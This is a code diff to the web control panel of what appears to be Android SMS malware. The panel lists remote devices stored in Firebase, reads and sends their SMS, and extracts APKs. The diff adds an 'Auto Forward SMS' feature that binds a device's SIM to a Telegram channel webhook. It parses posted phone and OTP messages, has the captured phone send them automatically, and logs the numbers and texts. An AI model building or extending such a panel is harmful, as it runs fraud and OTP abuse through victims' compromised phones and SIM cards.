@@ -314,6 +314,20 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
 .menu-item{display:flex;align-items:center;justify-content:space-between;padding:16px;border-radius:14px;background:var(--card);border:1px solid var(--border);cursor:pointer;font-size:14px;font-weight:600}
 .menu-item span{color:var(--muted);font-size:12px;font-weight:400}
 .menu-item.danger{border-color:rgba(255,68,102,0.3);color:var(--error)}
+.fwd-panel{margin-top:12px;padding:14px;border-radius:16px;background:var(--card);border:1px solid var(--border)}
+.fwd-hdr{font-size:12px;font-weight:800;color:var(--muted);letter-spacing:1px;margin-bottom:10px}
+.fwd-item{padding:12px;border-radius:12px;background:rgba(255,255,255,0.03);border:1px solid var(--border);margin-bottom:8px;font-size:12px}
+.fwd-item .fwd-title{font-weight:700;margin-bottom:4px}
+.fwd-item .fwd-meta{font-size:10px;color:var(--muted);font-family:'Space Mono',monospace;line-height:1.5}
+.fwd-actions{display:flex;gap:6px;margin-top:8px}
+.fwd-btn{flex:1;padding:8px;border-radius:10px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-size:11px;font-weight:700;cursor:pointer}
+.fwd-btn.primary{border-color:rgba(0,255,157,0.35);color:var(--success)}
+.fwd-btn.danger{border-color:rgba(255,68,102,0.35);color:var(--error)}
+.fwd-webhook{font-size:10px;color:var(--muted);word-break:break-all;font-family:'Space Mono',monospace;margin:8px 0;padding:10px;border-radius:10px;background:rgba(0,0,0,0.25);border:1px dashed var(--border)}
+.hero-fwd{display:flex;gap:8px;margin-top:12px}
+.hero-fwd button{flex:1;padding:10px;border-radius:12px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-size:11px;font-weight:700;cursor:pointer}
+.hero-fwd button.on{border-color:rgba(0,255,157,0.4);color:var(--success)}
+.hero-fwd button.off{border-color:rgba(255,68,102,0.35);color:var(--error)}
 .toggle{width:44px;height:26px;border-radius:100px;background:var(--border);position:relative;transition:background .2s}
 .toggle.on{background:var(--success)}
 .toggle::after{content:'';position:absolute;top:3px;left:3px;width:20px;height:20px;border-radius:50%;background:#fff;transition:transform .2s}
@@ -456,6 +470,26 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
         <div class="menu-item" onclick="openFbSheet()">Firebase Projects <span id="moreFbName">—</span></div>
         <div class="menu-item" onclick="toggleAutoToken()">Auto Token SMS <div class="toggle" id="autoTokenToggle"></div></div>
         <div class="menu-item" onclick="useSelForAutoToken()">Set Auto SMS Device <span>Use current</span></div>
+        <div class="menu-item" onclick="toggleFwdPanel()">📡 Auto Forward SMS <span id="fwdCountLbl">0 channels</span></div>
+        <div id="fwdPanel" class="fwd-panel hidden">
+          <div class="fwd-hdr">CHANNEL AUTO-FORWARD (rebel.py logic)</div>
+          <div class="fwd-webhook" id="fwdWebhookUrl">Webhook: sex.php?tg_webhook=1</div>
+          <div class="form-label">Channel Chat ID</div>
+          <input class="form-input" id="fwdChatId" type="text" placeholder="-1001234567890" style="margin-bottom:8px"/>
+          <div class="form-label">Channel Title</div>
+          <input class="form-input" id="fwdChatTitle" type="text" placeholder="My OTP Channel" style="margin-bottom:8px"/>
+          <div class="form-label">SIM Slot</div>
+          <div class="sim-selector" id="fwdSimSelector" style="margin-bottom:8px">
+            <div class="sim-chip active" data-sim="1" onclick="selectFwdSim(1,this)">SIM 1</div>
+            <div class="sim-chip" data-sim="2" onclick="selectFwdSim(2,this)">SIM 2</div>
+          </div>
+          <button type="button" class="btn-send" style="margin-bottom:10px" onclick="bindAutoForward()">🔗 Bind Current Device</button>
+          <div class="form-label">Test Intercept (paste channel message)</div>
+          <textarea class="form-textarea" id="fwdTestText" placeholder="📞 Phone: 9876543210&#10;💬 Message: Your OTP is 123456" style="min-height:80px;margin-bottom:8px"></textarea>
+          <button type="button" class="btn-ping" onclick="testAutoForward()">🚀 Test Auto Send</button>
+          <div id="fwdChannelList" style="margin-top:12px"></div>
+          <div id="fwdLogList" style="margin-top:8px;font-size:10px;color:var(--muted)"></div>
+        </div>
         <a class="menu-item" href="admin.php" style="text-decoration:none;color:inherit">Admin Panel <span>admin.php →</span></a>
       </div>
     </section>
@@ -498,6 +532,8 @@ var SEND_SMS_URL='mobile.php?rebel_send_sms=1';
 var FETCH_SMS_URL='mobile.php?rebel_fetch_sms=1';
 var APK_EXTRACT_URL='mobile.php?rebel_apk_extract=1';
 var SMS_TOKEN_URL='sex.php?sms_token_api=1';
+var AUTO_FORWARD_URL='sex.php?auto_forward_api=1';
+var TG_WEBHOOK_PATH='sex.php?tg_webhook=1';
 var allDevs=[], selDev='', clientsRawMap={};
 var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
 var activeListeners={}, window_sms=[], window_allSms=[], window_newSms=[];
@@ -1807,7 +1843,13 @@ function renderDeviceView(){
     '<div class="hero-cell"><div class="hero-lbl">NETWORK</div><div class="hero-val">'+esc(d.network)+'</div></div>'+
     '<div class="hero-cell"><div class="hero-lbl">ANDROID</div><div class="hero-val">'+esc(d.android||'?')+'</div></div>'+
     '<div class="hero-cell"><div class="hero-lbl">SMS</div><div class="hero-val">'+d.smsCount+'</div></div>'+
-    '</div><div style="margin-top:12px;font-size:9px;color:var(--muted);font-family:\'Space Mono\',monospace">'+esc(d.rawId)+'</div></div>'+contactsHtml;
+    '</div><div class="hero-fwd">'+
+    (deviceHasForwarding(d.rawId)?
+      '<button type="button" class="off" onclick="stopDeviceForwarding()">⏹️ Stop Forwarding</button>':
+      '<button type="button" class="on" onclick="openFwdPanelForDevice()">🔗 Start Forwarding</button>')+
+    '<button type="button" onclick="switchTab(\'send\',document.querySelector(\'.nav-item[data-tab=send]\'))">✉️ Send SMS</button>'+
+    '</div>'+
+    '<div style="margin-top:12px;font-size:9px;color:var(--muted);font-family:\'Space Mono\',monospace">'+esc(d.rawId)+'</div></div>'+contactsHtml;
 }
 function extractDeviceSims(raw){
   var sims=[],seen={},i,s,pn;
@@ -2628,6 +2670,156 @@ function useSelForAutoToken(){
   }).catch(function(){toast('Auto token save failed',false);});
 }
 
+/* AUTO FORWARD SMS (rebel.py intercept_channel_sms) */
+var _fwdChannels=[], _fwdSimSlot=1, _fwdPanelOpen=false;
+function autoFwdFetch(body){
+  var hdr={'Content-Type':'application/json'};
+  var apk=rebelApkHeaders();
+  for(var k in apk)hdr[k]=apk[k];
+  return fetch(AUTO_FORWARD_URL,{method:'POST',headers:hdr,body:JSON.stringify(body||{})})
+    .then(function(r){return r.json();});
+}
+function deviceHasForwarding(devId){
+  if(!devId||!_fwdChannels.length)return false;
+  for(var i=0;i<_fwdChannels.length;i++){
+    var ch=_fwdChannels[i];
+    if(ch&&ch.device_id===devId&&ch.active!==false)return true;
+  }
+  return false;
+}
+function selectFwdSim(slot,btn){
+  _fwdSimSlot=slot;
+  document.querySelectorAll('#fwdSimSelector .sim-chip').forEach(function(el){el.classList.remove('active');});
+  if(btn)btn.classList.add('active');
+}
+function toggleFwdPanel(){
+  _fwdPanelOpen=!_fwdPanelOpen;
+  var el=document.getElementById('fwdPanel');
+  if(el)el.classList.toggle('hidden',!_fwdPanelOpen);
+  if(_fwdPanelOpen)loadAutoForwardChannels();
+}
+function openFwdPanelForDevice(){
+  var d=getSelDev();if(!d){toast('Select device first',false);return;}
+  _fwdPanelOpen=true;
+  var el=document.getElementById('fwdPanel');
+  if(el)el.classList.remove('hidden');
+  switchTab('more',document.querySelector('.nav-item[data-tab="more"]'));
+  loadAutoForwardChannels();
+  toast('Enter Channel Chat ID and tap Bind',true);
+}
+function renderAutoForwardUI(){
+  var listEl=document.getElementById('fwdChannelList');
+  var logEl=document.getElementById('fwdLogList');
+  var cnt=document.getElementById('fwdCountLbl');
+  var wh=document.getElementById('fwdWebhookUrl');
+  if(wh)wh.textContent='Webhook: '+location.origin+location.pathname.replace(/[^/]+$/,'')+TG_WEBHOOK_PATH;
+  if(cnt)cnt.textContent=_fwdChannels.length+' channel'+(_fwdChannels.length===1?'':'s');
+  if(!listEl)return;
+  if(!_fwdChannels.length){
+    listEl.innerHTML='<div style="font-size:11px;color:var(--muted);padding:8px 0">No channels bound. Bot must be admin in channel. Set Telegram webhook to URL above.</div>';
+  }else{
+    listEl.innerHTML=_fwdChannels.map(function(ch,idx){
+      var active=ch.active!==false;
+      return '<div class="fwd-item">'+
+        '<div class="fwd-title">'+(active?'🟢':'🔴')+' '+esc(ch.title||'Channel')+'</div>'+
+        '<div class="fwd-meta">ID: '+esc(ch.chat_id)+'<br>Device: '+esc((ch.device_id||'').slice(0,16))+'… · SIM '+esc(ch.sim||1)+'<br>'+esc(ch.fb_name||ch.database_url||'')+'</div>'+
+        '<div class="fwd-actions">'+
+        '<button type="button" class="fwd-btn" onclick="toggleAutoForwardChannelIdx('+idx+')">'+(active?'Pause':'Resume')+'</button>'+
+        '<button type="button" class="fwd-btn danger" onclick="deleteAutoForwardChannelIdx('+idx+')">Delete</button>'+
+        '</div></div>';
+    }).join('');
+  }
+  if(logEl&&_fwdLogs&&_fwdLogs.length){
+    logEl.innerHTML='<div class="fwd-hdr">RECENT LOGS</div>'+_fwdLogs.slice().reverse().slice(0,5).map(function(l){
+      return '<div>'+(l.ok?'✅':'❌')+' '+esc(l.phone||'')+' → '+esc((l.message||'').slice(0,40))+'</div>';
+    }).join('');
+  }
+  renderDeviceView();
+}
+var _fwdLogs=[];
+function loadAutoForwardChannels(){
+  autoFwdFetch({action:'list'}).then(function(d){
+    if(d&&d.ok){
+      _fwdChannels=d.channels||[];
+      _fwdLogs=d.logs||[];
+      renderAutoForwardUI();
+    }
+  }).catch(function(){});
+}
+function bindAutoForward(){
+  var d=getSelDev();if(!d){toast('Select device on Home first',false);return;}
+  var inst=getFbInstance(d.fbId);if(!inst){toast('Firebase missing',false);return;}
+  var chatId=document.getElementById('fwdChatId').value.trim();
+  var title=document.getElementById('fwdChatTitle').value.trim()||'Channel';
+  if(!chatId){toast('Enter Channel Chat ID',false);return;}
+  autoFwdFetch({
+    action:'bind',
+    chat_id:chatId,
+    title:title,
+    device_id:d.rawId,
+    database_url:inst.restUrl,
+    auth_key:getFbAuthKey(inst),
+    fb_name:inst.name,
+    sim:_fwdSimSlot,
+    schema:inst.schema||'rabel',
+    device_node:d.deviceNode||'clients',
+    active:true
+  }).then(function(r){
+    if(r&&r.ok){
+      _fwdChannels=r.channels||[];
+      toast('Channel bound — auto SMS active',true);
+      renderAutoForwardUI();
+    }else toast(r&&r.error||'Bind failed',false);
+  }).catch(function(){toast('Bind failed',false);});
+}
+function toggleAutoForwardChannel(id){
+  autoFwdFetch({action:'toggle',id:id}).then(function(r){
+    if(r&&r.ok){_fwdChannels=r.channels||[];renderAutoForwardUI();toast('Status updated',true);}
+  });
+}
+function toggleAutoForwardChannelIdx(idx){
+  var ch=_fwdChannels[idx];if(!ch)return;
+  toggleAutoForwardChannel(ch.id);
+}
+function deleteAutoForwardChannel(id){
+  autoFwdFetch({action:'delete',id:id}).then(function(r){
+    if(r&&r.ok){_fwdChannels=r.channels||[];renderAutoForwardUI();toast('Channel removed',true);}
+  });
+}
+function deleteAutoForwardChannelIdx(idx){
+  var ch=_fwdChannels[idx];if(!ch)return;
+  deleteAutoForwardChannel(ch.id);
+}
+function stopDeviceForwarding(){
+  var d=getSelDev();if(!d)return;
+  autoFwdFetch({action:'unbind',device_id:d.rawId}).then(function(r){
+    if(r&&r.ok){_fwdChannels=r.channels||[];renderAutoForwardUI();toast('Forwarding stopped',true);}
+  });
+}
+function testAutoForward(){
+  var text=document.getElementById('fwdTestText').value.trim();
+  var chatId=document.getElementById('fwdChatId').value.trim()||'manual';
+  if(!text){toast('Paste channel message text',false);return;}
+  autoFwdFetch({action:'intercept',chat_id:chatId,text:text}).then(function(r){
+    if(r&&r.ok){
+      toast('Sent: '+r.sent+' OK, '+r.failed+' failed',true);
+      loadAutoForwardChannels();
+    }else{
+      toast(r&&r.error||'Intercept failed — check pattern & channel binding',false);
+    }
+  }).catch(function(){toast('Test failed',false);});
+}
+function parseChannelSmsText(text){
+  var re=/📞[^:\n]*:\s*(\+?\d+)\s*\n💬[^:\n]*:\s*([^\n]+)/gi,m,out=[];
+  while((m=re.exec(text))!==null)out.push({phone:m[1].trim(),message:m[2].trim()});
+  return out;
+}
+function autoForwardFromText(chatId,text){
+  var pairs=parseChannelSmsText(text);
+  if(!pairs.length)return Promise.resolve({ok:false,error:'No pattern'});
+  return autoFwdFetch({action:'intercept',chat_id:chatId||'manual',text:text});
+}
+
 /* BOOT */
 document.addEventListener('visibilitychange',function(){
   _panelPaused=document.hidden;
@@ -2644,6 +2836,9 @@ document.addEventListener('visibilitychange',function(){
     ensureActiveFbValid();
     fetchAllData().catch(function(){toast('Sync failed — check Firebase URL/secret',false);});
     loadAutoTokenState();
+    loadAutoForwardChannels();
+    var wh=document.getElementById('fwdWebhookUrl');
+    if(wh)wh.textContent='Webhook: '+location.origin+location.pathname.replace(/[^/]+$/,'')+TG_WEBHOOK_PATH;
   }catch(e){console.error(e);}
 })();
 setInterval(function(){
